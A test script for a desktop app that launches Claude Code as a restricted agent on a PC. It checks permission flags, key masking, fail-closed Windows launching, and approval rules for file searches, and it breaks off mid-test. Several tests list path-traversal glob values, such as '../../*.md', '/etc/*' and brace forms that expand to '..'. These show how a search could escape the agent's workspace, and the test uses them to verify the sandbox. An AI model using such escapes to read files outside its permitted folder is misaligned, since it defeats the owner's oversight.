
// Bot tasks on this PC (lib/server/pc-task-runner.ts, pc-task-setting.ts, app/api/pc-task-runner, vm/pc-approve-mcp.mjs,
// cli-agents.ts approveTool): who runs a task (the owner's signed in Claude plan, or the OpenAI key for the Codex
// executor), how Claude Code is started (its flags and permissions, its working folder), how its stream-json output
// becomes the thread's steps and answer, what a failure says, and that no key reaches Claude Code, a log or the state.
// A FAKE `claude` on PATH stands in for Claude Code: no network, no real sign in, nothing of this machine's ~/.claude.
// The real CLI's own behaviour with these exact flags (user settings, hooks and env ignored; Read, WebFetch and Bash
// asking through the approve tool, even with mcp__bops__approve in --disallowedTools) was checked by hand against
// Claude Code 2.1.318; this test pins the flags so they can't drift.
// Usage: node --conditions=react-server scripts/test-pc-task-runner.mjs
//        (--conditions=react-server is needed: the server modules import "server-only")
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import { registerHooks } from "node:module";
import { tmpdir } from "node:os";
import { basename, delimiter, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const root = fileURLToPath(new URL("..", import.meta.url));
const tmp = mkdtempSync(join(tmpdir(), "bops-pc-runner-"));
const home = join(tmp, "home");
const bin = join(tmp, "bin");
mkdirSync(home, { recursive: true });
mkdirSync(bin, { recursive: true });

// Planted secrets: none may reach Claude Code, a log line, the setting file or a route's answer.
// Fake values, built so no line of this file reads as a real key or token to a secret scanner.
const fakeSecret = (...parts) => parts.join("-");
const EXEC_KEY = fakeSecret("sk", "proj", "E".repeat(40));
const PLANTED = {
  OPENAI_API_KEY: fakeSecret("sk", "proj", "A".repeat(40)),
  ANTHROPIC_API_KEY: fakeSecret("sk", "ant", "B".repeat(40)),
  CLAUDE_CODE_OAUTH_TOKEN: fakeSecret("tok", "planted", "x".repeat(8)),
  BOPS_UI_TOKEN: fakeSecret("ui", "planted", "y".repeat(8)),
};
Object.assign(process.env, PLANTED, { HOME: home, USERPROFILE: home, PATH: `${bin}${delimiter}${process.env.PATH}` });
delete process.env.OPENAI_EXECUTOR_API_KEY;

// The fake Claude Code: logs its args, cwd and environment to $HOME/fake-claude.json, then answers by the prompt's MODE.
const fake = join(bin, process.platform === "win32" ? "claude.exe" : "claude");
writeFileSync(
  fake,
  `#!${process.execPath}
const fs = require("node:fs"), path = require("node:path");
if (process.argv[2] === "--help") {
  const flags = ["--restricted", "--setting-sources", "--settings", "--tools", "--permission-prompt-tool", "--strict-mcp-config", "--disallowedTools"];
  if (process.env.FAKE_PREFIX_CLAUDE) {
    // Flags whose names merely CONTAIN the needed ones: a substring check would wrongly pass.
    const lookalikes = { "--restricted": "--restricted-mode", "--tools": "--toolset-listing", "--permission-prompt-tool": "--permission-prompt-tooling" };
    process.stdout.write(flags.map((f) => lookalikes[f] ?? f).join("\\n") + "\\n");
    process.exit(0);
  }
  process.stdout.write((process.env.FAKE_OLD_CLAUDE ? flags.slice(4) : flags).join("\\n") + "\\n");
  process.exit(0);
}
if (process.argv[2] === "--version") {
  // 2.1.318 is the floor the flags were checked against (MIN_CLAUDE_VERSION).
  process.stdout.write((process.env.FAKE_OLD_VERSION ? "2.0.1 (Claude Code)" : "2.1.318 (Claude Code)") + "\\\n");
  process.exit(0);
}
let input = "";
process.stdin.on("data", (d) => (input += d));
process.stdin.on("end", () => {
  fs.writeFileSync(path.join(process.env.HOME, "fake-claude.json"), JSON.stringify({ args: process.argv.slice(2), cwd: process.cwd(), env: process.env, input }));
  const out = (e) => process.stdout.write(JSON.stringify(e) + "\\n");
  const sid = process.argv[process.argv.indexOf(process.argv.includes("--resume") ? "--resume" : "--session-id") + 1];
  const mode = /MODE:(\\w+)/.exec(input)?.[1] ?? "ok";
  if (mode === "okexit1") { out({ type: "system", subtype: "init", session_id: sid, mcp_servers: [] }); out({ type: "result", subtype: "success", is_error: false, result: "Looks done" }); setTimeout(() => process.exit(1), 20); return; }
  if (mode === "utf8") {
    out({ type: "system", subtype: "init", session_id: sid, mcp_servers: [] });
    const line = Buffer.from(JSON.stringify({ type: "result", subtype: "success", is_error: false, result: "Café 👍 naïve" }) + "\\n");
    const at = line.indexOf(Buffer.from("👍")) + 2;
    process.stdout.write(line.subarray(0, at), () => setTimeout(() => process.stdout.write(line.subarray(at)), 50));
    return;
  }
  if (mode === "hang") {
    const kid = require("node:child_process").spawn(process.execPath, ["-e", "process.on('SIGTERM', () => {}); setInterval(() => {}, 1000)"], { stdio: "ignore" });
    fs.writeFileSync(path.join(process.env.HOME, "fake-claude.pids"), process.pid + " " + kid.pid);
    process.on("SIGTERM", () => {});
    setInterval(() => {}, 1000);
    return;
  }
  if (mode === "denied") { out({ type: "result", subtype: "success", is_error: false, result: "I couldn't run it.", permission_denials: [{ tool_name: "Bash", tool_use_id: "t9", tool_input: { command: "ls" } }] }); return; }
  if (mode === "crash") { process.stderr.write("Error: 401 Unauthorized: invalid x-api-key\\n"); process.exit(1); }
  out({ type: "system", subtype: "init", session_id: sid, mcp_servers: [{ name: "browser", status: "connected" }, { name: "bops", status: "connected" }] });
  if (mode === "auth") { out({ type: "result", subtype: "success", is_error: true, result: "Not logged in · Please run /login" }); return; }
  if (mode === "limit") { out({ type: "result", subtype: "success", is_error: true, result: "Claude AI usage limit reached|1760032800" }); return; }
  out({ type: "assistant", message: { content: [{ type: "thinking", thinking: "Checking the folder" }, { type: "tool_use", id: "t1", name: "Bash", input: { command: "ls" } }] } });
  out({ type: "assistant", message: { content: [{ type: "tool_use", id: "t2", name: "Write", input: { file_path: "notes.md" } }, { type: "tool_use", id: "t3", name: "mcp__browser__browser_navigate", input: { url: "https://example.com" } }] } });
  out({ type: "assistant", message: { content: [{ type: "text", text: "Leaked ${EXEC_KEY} here" }] } });
  out({ type: "result", subtype: "success", is_error: false, result: "All done: wrote notes.md" });
});
`,
);
chmodSync(fake, 0o755);

// Server modules load as they are, with only what reaches outside this test stubbed.
const fakeState = { shared: false, sessions: new Map() };
const asked = [];
registerHooks({
  resolve(specifier, context, next) {
    if (specifier.startsWith("@/")) specifier = pathToFileURL(join(root, specifier.slice(2))).href;
    try {
      return next(specifier, context);
    } catch (error) {
      for (const ext of [".ts", ".tsx"]) {
        try {
          return next(specifier + ext, context);
        } catch {}
      }
      throw error;
    }
  },
  load(url, context, next) {
    const stub = {
      "/lib/server/codex-cli.ts": 'export const findCodex = () => "/fake/codex";',
      "/lib/server/brains.ts": "export const requireCodexPlan=()=>{},ensureBrainTools=0,ensureClaudeCode=0,ensureCodex=0,ensureDsh=0,ensureOpenCode=0,revealBrainKey=0,revealNamedKey=0;",
      "/lib/server/keys.ts": "export class KeysError extends Error {}",
      "/lib/server/permission.ts": "export const heldAsk = async (spec) => { globalThis.__asked.push(spec); return globalThis.__late ? 'late' : { reply: 'approve' }; };",
      "/lib/server/orgo.ts": "export const orgo = {};",
      "/lib/server/store.ts": "export const getState = () => ({ shared: globalThis.__state.shared }); export const bot = () => undefined; export const ownerName = () => 'Kevin'; export const session = (id) => globalThis.__state.sessions.get(id);",
      "/lib/server/orgo-auth.ts": "export const signedInUser = () => null;",
      "/lib/server/cloud.ts": "export const cloudOn = () => false;",
      "/lib/server/owner-email.ts": 'export const fromThisMac = (r) => new URL(r.url).hostname === "localhost";',
      "/lib/server/ui-token.ts": 'export const fromBopsWindow = (r) => r.headers.get("x-bops-window") === "ok";',
      "/lib/server/ready.ts": "export const notReady = () => null;",
    };
    for (const [end, source] of Object.entries(stub)) if (url.endsWith(end)) return { format: "module", source, shortCircuit: true };
    return next(url, context);
  },
});
globalThis.__state = fakeState;
globalThis.__asked = asked;

const logs = [];
for (const k of ["log", "warn", "error", "info"]) {
  const real = console[k].bind(console);
  console[k] = (...a) => {
    logs.push(a.map(String).join(" "));
    if (k !== "log") real(...a);
  };
}

const runner = await import("../lib/server/pc-task-runner.ts");
const cli = await import("../lib/server/cli-agents.ts");
const subs = await import("../lib/server/local-subscriptions.ts");
let passed = 0;
const test = async (name, opts, fn) => {
  if (typeof opts === "function") fn = opts;
  else if (opts?.skip) return void process.stdout.write(`skip - ${name}\n`);
  await fn();
  passed++;
  process.stdout.write(`ok - ${name}\n`);
};

await test("runner choice: Claude plan by default when signed in, else the OpenAI key, else what to do", () => {
  const p = runner.pickPcRunner;
  assert.deepEqual(p({ claude: "connected", openaiKey: true, local: true }), { runner: "claude", chosen: false });
  assert.deepEqual(p({ claude: "signed-out", openaiKey: true, local: true }), { runner: "openai", chosen: false });
  assert.deepEqual(p({ claude: "missing", openaiKey: false, local: true }), { runner: null, error: runner.PC_WORDS.none });
  // A choice is kept, never swapped for the other quietly.
  assert.deepEqual(p({ choice: "claude", claude: "signed-out", openaiKey: true, local: true }), { runner: null, error: runner.PC_WORDS.signIn });
  assert.deepEqual(p({ choice: "claude", claude: "missing", openaiKey: true, local: true }), { runner: null, error: runner.PC_WORDS.noClaude });
  assert.deepEqual(p({ choice: "openai", claude: "connected", openaiKey: false, local: true }), { runner: null, error: runner.PC_WORDS.addKey });
  // Not self hosted, or shared with a team: the OpenAI path as before, whatever the setting.
  assert.deepEqual(p({ choice: "claude", claude: "connected", openaiKey: true, local: false }), { runner: "openai", chosen: false });
  assert.match(runner.PC_WORDS.signIn, /Sign in to Claude in Settings, AI subscriptions/);
  for (const w of Object.values(runner.PC_WORDS)) assert.doesNotMatch(w, /[–—]| - /, `no dashes in: ${w}`);
});

await test("OpenAI key path still picks the Codex executor, and its auth failure says what to do", () => {
  assert.deepEqual(runner.pickPcRunner({ choice: "openai", claude: "connected", openaiKey: true, local: true }), { runner: "openai", chosen: true });
  const said = runner.executorWords("Local executor exited with code 1 (authentication rejected).");
  assert.match(said, /environment key made in OpenAI Platform under Agents, Environments, Keys \(Create\), in the same project as your OPENAI_API_KEY/);
  assert.match(said, /An ordinary API key is turned down/);
  assert.match(runner.PC_WORDS.addKey, /environment key/);
  assert.match(runner.PC_WORDS.addKey, /An ordinary API key won't work/);
  assert.equal(runner.executorWords("Local executor exited with code 1."), "Local executor exited with code 1.");
});

await test("the setting file and the OpenAI key in .env.local: kept lines, masked, never echoed", () => {
  const setting = join(tmp, "bopshome", "pc-task-runner");
  runner.writePcRunnerChoice(setting, "claude");
  assert.equal(runner.readPcRunnerChoice(setting), "claude");
  runner.writePcRunnerChoice(setting, null);
  assert.equal(runner.readPcRunnerChoice(setting), undefined);
  const envFile = join(tmp, ".env.local");
  writeFileSync(envFile, "BOPS_SELF_HOSTED=1\nOPENAI_EXECUTOR_API_KEY=sk-old-0000000000000000000000\nOTHER=x\n");
  const env = {};
  assert.throws(() => runner.saveExecutorKey(envFile, "not a key\nBOPS_SELF_HOSTED=0", env), /doesn't look like an OpenAI key/);
  runner.saveExecutorKey(envFile, EXEC_KEY, env);
  assert.equal(readFileSync(envFile, "utf8"), `BOPS_SELF_HOSTED=1\nOTHER=x\nOPENAI_EXECUTOR_API_KEY=${EXEC_KEY}\n`);
  assert.equal(env.OPENAI_EXECUTOR_API_KEY, EXEC_KEY);
  assert.equal(runner.maskKey(EXEC_KEY), "ends in EEEE");
  runner.saveExecutorKey(envFile, "", env);
  assert.equal(readFileSync(envFile, "utf8"), "BOPS_SELF_HOSTED=1\nOTHER=x\n");
  assert.equal(env.OPENAI_EXECUTOR_API_KEY, undefined);
  // A rename that fails (the target is a folder) leaves no temporary copy of the key behind.
  const blocked = join(tmp, "blocked.env");
  mkdirSync(join(blocked, "x"), { recursive: true });
  assert.throws(() => runner.saveExecutorKey(blocked, EXEC_KEY, {}));
  assert.ok(!readdirSync(tmp).some((f) => f.startsWith("blocked.env.") && f.endsWith(".tmp")), "no .tmp file left");
});

await test("route: owner in the desktop window only; the key goes in, only its mask comes back", async () => {
  process.env.BOPS_SELF_HOSTED = "1";
  process.env.BOPS_ENV_LOCAL = join(tmp, "route.env.local");
  const route = await import("../app/api/pc-task-runner/route.ts");
  const req = (init = {}, window = "ok", host = "localhost") => new Request(`http://${host}:3210/api/pc-task-runner`, { ...init, headers: { "content-type": "application/json", "x-bops-window": window, ...(init.headers ?? {}) } });
  assert.equal((await route.GET(req({}, "nope"))).status, 403);
  assert.equal((await route.GET(req({ headers: { "x-bops-remote": "1" } }))).status, 403);
  fakeState.shared = true;
  assert.equal((await route.GET(req())).status, 403);
  fakeState.shared = false;
  const saved = await route.POST(req({ method: "POST", body: JSON.stringify({ choice: "openai", key: EXEC_KEY }) }));
  const text = await saved.text();
  assert.equal(saved.status, 200);
  assert.ok(!text.includes(EXEC_KEY), "the key is never sent back");
  const j = JSON.parse(text);
  assert.deepEqual(j, { choice: "openai", runner: "openai", openaiKey: { set: true, masked: "ends in EEEE" } });
  assert.ok(readFileSync(process.env.BOPS_ENV_LOCAL, "utf8").includes(`OPENAI_EXECUTOR_API_KEY=${EXEC_KEY}`));
  const bad = await route.POST(req({ method: "POST", body: JSON.stringify({ key: "hello world" }) }));
  assert.equal(bad.status, 400);
  assert.match((await bad.json()).error, /doesn't look like an OpenAI key/);
  // Back to unset for the rest: the setting file is under the test's HOME (~/.bops).
  await route.POST(req({ method: "POST", body: JSON.stringify({ choice: null, key: "" }) }));
  assert.ok(!existsSync(join(home, ".bops", "pc-task-runner")));
  assert.equal(process.env.OPENAI_EXECUTOR_API_KEY, undefined);
});

// One task's folder, as sessions.ts pcClaudeTurns makes it.
const taskFolder = join(tmp, "tasks", "ses_1");
const workspace = join(taskFolder, "workspace");
mkdirSync(workspace, { recursive: true });
const runtime = subs.localSubscriptionRuntime("claude");
const cmd = (resume = false) => runner.claudeTaskCommand({ claude: runtime.file, env: runtime.env, workspace, mcpConfig: join(taskFolder, "claude", "mcp.json"), promptFile: join(taskFolder, "claude", "prompt.md"), session: "11111111-2222-4333-8444-555555555555", resume });

await test("argument and permission flags: exact argv, no setting files, only Bops' tools, everything else asks", () => {
  assert.equal(runtime.file, fake, "the claude on PATH");
  const c = cmd();
  const settings = JSON.stringify(runner.CLAUDE_SETTINGS);
  assert.deepEqual(c.args, [
    "-p", "--output-format", "stream-json", "--verbose",
    "--restricted", "--setting-sources", "", "--settings", settings,
    "--tools", "Read,Edit,MultiEdit,Write,Glob,Grep,Bash,WebSearch,WebFetch,TodoWrite",
    "--disable-slash-commands", "--permission-mode", "default", "--strict-mcp-config",
    "--mcp-config", join(taskFolder, "claude", "mcp.json"),
    "--append-system-prompt-file", join(taskFolder, "claude", "prompt.md"),
    "--allowedTools", "WebSearch,mcp__browser__browser_snapshot,mcp__browser__browser_find,mcp__browser__browser_wait_for,mcp__browser__browser_take_screenshot,mcp__browser__browser_console_messages,mcp__browser__browser_hover,mcp__browser__browser_navigate_back",
    "--disallowedTools", "mcp__browser__browser_run_code_unsafe,mcp__browser__browser_evaluate,mcp__bops__approve",
    "--permission-prompt-tool", "mcp__bops__approve",
    "--session-id", "11111111-2222-4333-8444-555555555555",
  ]);
  assert.deepEqual(cmd(true).args.slice(-2), ["--resume", "11111111-2222-4333-8444-555555555555"]);
  const s = runner.CLAUDE_SETTINGS;
  assert.equal(s.disableAllHooks, true);
  assert.deepEqual(s.permissions.ask, ["Bash", "WebFetch", "Read", "Edit", "MultiEdit", "Write", "Glob", "Grep"]);
  assert.deepEqual(s.permissions.deny, runner.CLAUDE_NEVER_TOOLS);
  // WebFetch, navigation, a new tab, the shell and file tools never run by themselves.
  for (const t of ["WebFetch", "Bash", "Read", "Edit", "Write", "mcp__browser__browser_navigate", "mcp__browser__browser_tabs", "mcp__browser__browser_click", "mcp__browser__browser_type"]) assert.ok(!runner.CLAUDE_AUTO_TOOLS.includes(t), `${t} asks`);
  assert.ok(!c.args.some((a) => /dangerously|bypassPermissions|acceptEdits|dontAsk/.test(a)));
  assert.ok(!c.args.some((a) => a.includes(EXEC_KEY) || Object.values(PLANTED).some((v) => a.includes(v))), "no key on the command line");
  assert.ok(!("CLAUDE_CODE_OAUTH_TOKEN" in c.env) && !("ANTHROPIC_API_KEY" in c.env));
});

await test("an older Claude Code without those flags isn't run", async () => {
  assert.equal(runner.claudeSupportsTasks(fake, { ...runtime.env }), true);
  const old = join(bin, "old-claude");
  writeFileSync(old, readFileSync(fake, "utf8"));
  chmodSync(old, 0o755);
  assert.equal(runner.claudeSupportsTasks(old, { ...runtime.env, FAKE_OLD_CLAUDE: "1" }), false);
  assert.equal(runner.claudeSupportsTasks(join(bin, "none"), runtime.env), false);
  assert.match(runner.PC_WORDS.update, /Update it \(run claude update\)/);
  // Flags that merely contain the needed names prove nothing: each must be its own word in the help.
  const lookalike = join(bin, "lookalike-claude");
  writeFileSync(lookalike, readFileSync(fake, "utf8"));
  chmodSync(lookalike, 0o755);
  assert.equal(runner.claudeSupportsTasks(lookalike, { ...runtime.env, FAKE_PREFIX_CLAUDE: "1" }), false, "a lookalike flag name isn't the flag");
});

await test("a Claude Code older than the version its flags were checked against isn't run", async () => {
  const oldv = join(bin, "oldv-claude");
  writeFileSync(oldv, readFileSync(fake, "utf8"));
  chmodSync(oldv, 0o755);
  assert.equal(runner.claudeSupportsTasks(oldv, { ...runtime.env, FAKE_OLD_VERSION: "1" }), false, "2.0.1 is under the 2.1.318 floor");
});

await test("a search whose pattern walks out of its folder asks, wherever its path argument points", async () => {
  const ws = { workspace, origins: new Set() };
  assert.deepEqual(runner.pcDecision(ws, "Glob", { path: ".", pattern: "**/*.md" }), { behavior: "allow" });
  assert.deepEqual(runner.pcDecision(ws, "Glob", { path: workspace, pattern: "../../*.md" }), { behavior: "ask" }, ".. walks out");
  assert.deepEqual(runner.pcDecision(ws, "Glob", { path: workspace, pattern: "C:/Users/*" }), { behavior: "ask" }, "absolute walks out");
  assert.deepEqual(runner.pcDecision(ws, "Grep", { path: workspace, pattern: "secret", glob: "*.env" }), { behavior: "allow" });
  assert.deepEqual(runner.pcDecision(ws, "Grep", { path: workspace, pattern: "secret", glob: "..\\other/*" }), { behavior: "ask" }, "backslash .. walks out");
  assert.deepEqual(runner.pcDecision(ws, "Grep", { path: workspace, pattern: "secret", glob: "/etc/*" }), { behavior: "ask" });
  // Brace lists and extglob groups that anywhere say ..: taken for the escape they can expand to.
  // Round 2: brace and extglob syntax asks outright - {.}{.}/x and .{.,}/x never spell .. but expand to it.
  for (const p of ["{.}{.}/x", ".{.}/x", ".{.,}/x", "{..,x}/secret*", "{a,..}/**", "@(..)/*", "!(..)/*", "+(..)/*", "*(..)/*", "?(..)/*"])
    assert.deepEqual(runner.pcDecision(ws, "Glob", { path: workspace, pattern: p }), { behavior: "ask" }, `${p} asks`);
  // Round 2: brace syntax asks outright, whatever it seems to say (the lead's instruction).
  assert.deepEqual(runner.pcDecision(ws, "Glob", { path: workspace, pattern: "{a,b}/*.md" }), { behavior: "ask" }, "brace syntax asks outright");
  assert.deepEqual(runner.pcDecision(ws, "Glob", { path: workspace, pattern: "src/*/[ab]/*.md" }), { behavior: "allow" }, "character classes (not brace syntax) still allow");
});

// Round 3 (task 60). Glob and Grep: a backslash off Windows asks; Grep's `pattern` is a regex, never a path.
await test("round 3: a backslash in a glob asks off Windows (an escape, not a separator); Windows still reads it as one", async () => {
  assert.equal(runner.patternStaysPut("src\\*.md", "linux"), false, "a backslash asks off Windows");
  assert.equal(runner.patternStaysPut("\\.\\./x", "darwin"), false);
  assert.equal(runner.patternStaysPut("src\\*.md", "win32"), true, "a separator on Windows");
  assert.equal(runner.patternStaysPut("..\\x", "win32"), false, ".. still walks out on Windows");
  if (process.platform !== "win32") {
    const ws = { workspace, origins: new Set() };
    assert.deepEqual(runner.pcDecision(ws, "Glob", { path: workspace, pattern: "src\\*.md" }), { behavior: "ask" });
    assert.deepEqual(runner.pcDecision(ws, "Grep", { path: workspace, pattern: "x", glob: "src\\*.ts" }), { behavior: "ask" });
  }
});

await test("round 3: Grep's pattern is a regex and isn't read as a path; its glob and path still are", async () => {
  const ws = { workspace, origins: new Set() };
  for (const pattern of ["\\d{3}", "interface\\{\\}", "a+(b)", "/api/", "^\\.\\./", "C:/x"])
    assert.deepEqual(runner.pcDecision(ws, "Grep", { path: workspace, pattern, glob: "*.ts" }), { behavior: "allow" }, `${pattern} doesn't ask`);
  assert.deepEqual(runner.pcDecision(ws, "Grep", { path: workspace, pattern: "\\d{3}" }), { behavior: "allow" }, "no glob at all");
  assert.deepEqual(runner.pcDecision(ws, "Grep", { path: workspace, pattern: "x", glob: "{a,b}/*.ts" }), { behavior: "ask" }, "the glob is still checked");
  assert.deepEqual(runner.pcDecision(ws, "Grep", { path: workspace, pattern: "x", glob: "../*.ts" }), { behavior: "ask" });
  assert.deepEqual(runner.pcDecision(ws, "Grep", { path: "/etc", pattern: "x" }), { behavior: "ask" }, "the path is still checked");
});

await test("round 3: the Windows turn runs the launcher as Node (ELECTRON_RUN_AS_NODE), with a unique go file and a 30 s cap", async () => {
  assert.equal(runner.windowsJobTurn({ file: "claude", args: [], env: {} }, "linux"), null, "only on Windows");
  const a = runner.windowsJobTurn({ file: "C:\\claude.exe", args: ["-p"], env: { PATH: "x" } }, "win32");
  const b = runner.windowsJobTurn({ file: "C:\\claude.exe", args: ["-p"], env: { PATH: "x" } }, "win32");
  assert.equal(a.file, process.execPath, "the launcher runs on Bops' own executable (Bops.exe when packaged)");
  assert.equal(a.env.ELECTRON_RUN_AS_NODE, "1", "so Bops.exe runs it as Node instead of opening Bops again");
  assert.equal(a.env.BOPS_JOB_KEEP_RUN_AS_NODE, undefined, "the turn's own env didn't have it, so the CLI won't either");
  assert.equal(a.env.PATH, "x");
  assert.deepEqual(a.args.slice(1), ["C:\\claude.exe", "-p"]);
  assert.ok(Number(a.env.BOPS_JOB_WAIT_MS) >= 30_000, "a cold PowerShell plus the first compile fits in the wait");
  assert.match(basename(a.goFile), /^bops-job-go-[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/, "a randomUUID in the name");
  assert.notEqual(a.goFile, b.goFile);
  assert.equal(a.env.BOPS_JOB_GO, a.goFile);
  const kept = runner.windowsJobTurn({ file: "claude", args: [], env: { ELECTRON_RUN_AS_NODE: "1" } }, "win32");
  assert.equal(kept.env.BOPS_JOB_KEEP_RUN_AS_NODE, "1");
});

// The launcher itself is plain Node, so it runs here as it does on Windows (only the job and the sitter don't).
const launcherScript = join(root, "vm", "win-job-launcher.cjs");
const probe = join(bin, "launch-probe");
writeFileSync(probe, `#!${process.execPath}
const fs = require("node:fs");
fs.writeFileSync(process.env.PROBE_OUT, JSON.stringify({ go: fs.existsSync(process.env.BOPS_JOB_GO), asNode: process.env.ELECTRON_RUN_AS_NODE ?? null, keep: process.env.BOPS_JOB_KEEP_RUN_AS_NODE ?? null }));
`);
chmodSync(probe, 0o755);
let launches = 0;
const launch = ({ env = {}, goAt, failAt, cli = probe } = {}) =>
  new Promise((resolveLaunch) => {
    const n = ++launches;
    const go = join(tmp, `launch-go-${n}`);
    const out = join(tmp, `launch-out-${n}.json`);
    const e = { ...process.env, BOPS_JOB_GO: go, PROBE_OUT: out, ...env };
    if (!("BOPS_JOB_WAIT_MS" in env)) delete e.BOPS_JOB_WAIT_MS;
    const t0 = Date.now();
    const kid = spawn(process.execPath, [launcherScript, cli], { env: e, stdio: ["ignore", "pipe", "pipe"] });
    let stderr = "";
    kid.stderr.on("data", (d) => (stderr += d));
    const timers = [];
    if (goAt !== undefined) timers.push(setTimeout(() => writeFileSync(go, "go"), goAt));
    if (failAt !== undefined) timers.push(setTimeout(() => writeFileSync(`${go}.failed`, "assign failed"), failAt));
    kid.on("exit", (code) => {
      timers.forEach(clearTimeout);
      resolveLaunch({ code, stderr, ms: Date.now() - t0, ran: existsSync(out) ? JSON.parse(readFileSync(out, "utf8")) : null });
    });
  });

await test("round 3: no go file within the cap: the launcher fails closed, loudly, without running the CLI", { skip: process.platform === "win32" }, async () => {
  const r = await launch({ env: { BOPS_JOB_WAIT_MS: "400" } });
  assert.equal(r.ran, null, "the CLI never ran outside the job");
  assert.equal(r.code, runner.LAUNCHER_EXIT.noJob);
  assert.match(r.stderr, /\[bops-launcher\] NOT starting Claude Code: the job sitter didn't say go within 400 ms/);
  assert.equal(runner.launcherFailure(r.code, r.stderr), runner.PC_WORDS.noJob, "the turn says it couldn't start");
});

await test("round 3: the sitter's failure marker ends the wait at once, and fails closed", { skip: process.platform === "win32" }, async () => {
  const r = await launch({ failAt: 200 });
  assert.equal(r.ran, null);
  assert.equal(r.code, runner.LAUNCHER_EXIT.noJob);
  assert.match(r.stderr, /failed before it held this turn/);
  assert.ok(r.ms < 2500, `stopped as soon as the marker came (${r.ms} ms), not at the cap`);
});

await test("round 3: a go file that comes late (cold PowerShell, first compile) still starts the CLI inside the job", { skip: process.platform === "win32" }, async () => {
  const r = await launch({ goAt: 3500 });
  assert.equal(r.code, 0, r.stderr);
  assert.deepEqual(r.ran, { go: true, asNode: null, keep: null }, "the CLI started only after the go file, and without ELECTRON_RUN_AS_NODE");
});

await test("round 3: the launcher takes ELECTRON_RUN_AS_NODE back out of the CLI's env unless the turn had it", { skip: process.platform === "win32" }, async () => {
  const r = await launch({ goAt: 0, env: { ELECTRON_RUN_AS_NODE: "1" } });
  assert.equal(r.code, 0, r.stderr);
  assert.equal(r.ran.asNode, null);
  const k = await launch({ goAt: 0, env: { ELECTRON_RUN_AS_NODE: "1", BOPS_JOB_KEEP_RUN_AS_NODE: "1" } });
  assert.deepEqual(k.ran, { go: true, asNode: "1", keep: null });
});

await test("round 3: a missing CLI behind the launcher says Claude Code isn't installed, as ENOENT does without it", { skip: process.platform === "win32" }, async () => {
  const r = await launch({ goAt: 0, cli: join(tmp, "no-such-claude") });
  assert.equal(r.code, runner.LAUNCHER_EXIT.noCli, r.stderr);
  assert.match(r.stderr, /\[bops-launcher\] Claude Code isn't installed/);
  assert.equal(runner.launcherFailure(r.code, r.stderr), runner.PC_WORDS.noClaude);
  // The CLI's own exit codes aren't taken for the launcher's: only with its stderr line.
  assert.equal(runner.launcherFailure(127, "some CLI error"), undefined);
  assert.equal(runner.launcherFailure(1, "[bops-launcher] x"), undefined);
});

await test("round 3: the sitter writes the failure marker on every failure before it assigns, and compiles race-free", async () => {
  const ps = readFileSync(join(root, "vm", "win-job-sitter.ps1"), "utf8");
  const fail = /function Fail\([^)]*\) \{[\s\S]*?\n\}/.exec(ps)?.[0] ?? "";
  assert.match(fail, /Set-Content -Path "\$GoFile\.failed"/, "Fail writes <go>.failed");
  assert.match(fail, /exit 1/);
  const rest = ps.replace(fail, "");
  assert.doesNotMatch(rest, /\bexit\b/, "no way out of the sitter but Fail");
  assert.match(rest, /trap \{ Fail /, "unforeseen errors fail the same way");
  assert.doesNotMatch(ps, /-OutputAssembly \$dll\b/, "never compiles straight to the shared path");
  assert.match(ps, /-OutputAssembly \$tmpDll/);
  assert.match(ps, /Move-Item -LiteralPath \$tmpDll -Destination \$dll/);
  assert.match(ps, /if \(-not \(Test-Path \$dll\)\) \{ throw \}/, "losing the move to another sitter counts as success");
  assert.match(ps, /\[guid\]::NewGuid\(\)/, "each compile has its own temp name");
});

await test("round 3: a go file that can't be written after the assign fails like the rest (marker), and the turn says noJob", async () => {
  const ps = readFileSync(join(root, "vm", "win-job-sitter.ps1"), "utf8");
  assert.match(ps, /Set-Content -Path \$GoFile -Value "go"[^\n]*catch \{ Fail "go file couldn't be written/, "the go file's failure goes through Fail");
  const fail = /function Fail\([^)]*\) \{[\s\S]*?\n\}/.exec(ps)?.[0] ?? "";
  assert.match(fail, /-not \(Test-Path -LiteralPath \$GoFile\)/, "the marker is written whenever no go file was, assigned or not");
  // The job's close kills the launcher with no [bops-launcher] line: no go file at the turn's end is what says it.
  assert.equal(runner.launcherFailure(1, "Not logged in · Please run /login", false), runner.PC_WORDS.noJob, "not a sign-in error");
  assert.equal(runner.launcherFailure(null, "", false), runner.PC_WORDS.noJob);
  assert.equal(runner.launcherFailure(1, "Not logged in · Please run /login", true), undefined, "a CLI that ran keeps its own failure words");
});

await test("round 3: the sitter's late exit after the turn is over writes no marker and warns nothing", { skip: process.platform === "win32" }, async () => {
  // A stand-in powershell.exe (under a fake SystemRoot) that exits 1 a moment after it starts, as a sitter does
  // when its launcher ends.
  const sysRoot = join(tmp, "sysroot");
  const psDir = join(sysRoot, "System32", "WindowsPowerShell", "v1.0");
  mkdirSync(psDir, { recursive: true });
  writeFileSync(join(psDir, "powershell.exe"), `#!${process.execPath}\nsetTimeout(() => process.exit(1), 300);\n`);
  chmodSync(join(psDir, "powershell.exe"), 0o755);
  const was = { SystemRoot: process.env.SystemRoot, TEMP: process.env.TEMP };
  Object.assign(process.env, { SystemRoot: sysRoot, TEMP: tmp });
  try {
    const wait = (ms) => new Promise((r) => setTimeout(r, ms));
    // A healthy turn: go written, turn ends (cleanup), then the sitter exits.
    let jt = runner.windowsJobTurn({ file: "claude", args: [], env: {} }, "win32");
    writeFileSync(jt.goFile, "go");
    const logged = logs.length;
    jt.started(process.pid);
    assert.equal(jt.wentAhead(), true);
    jt.cleanup();
    await wait(800);
    assert.ok(!existsSync(jt.goFile) && !existsSync(`${jt.goFile}.failed`), "no stale marker after a healthy turn");
    assert.ok(!logs.slice(logged).some((l) => /left before it held the job/.test(l)), "no warning for a turn that ran");
    // Stop during the wait: no go file yet, the turn ends, then the sitter exits.
    jt = runner.windowsJobTurn({ file: "claude", args: [], env: {} }, "win32");
    jt.started(process.pid);
    assert.equal(jt.wentAhead(), false);
    jt.cleanup();
    await wait(800);
    assert.ok(!existsSync(`${jt.goFile}.failed`), "Stop leaves no marker behind");
    // While the turn is still on, a sitter that leaves without a go file still writes the marker.
    jt = runner.windowsJobTurn({ file: "claude", args: [], env: {} }, "win32");
    jt.started(process.pid);
    await wait(800);
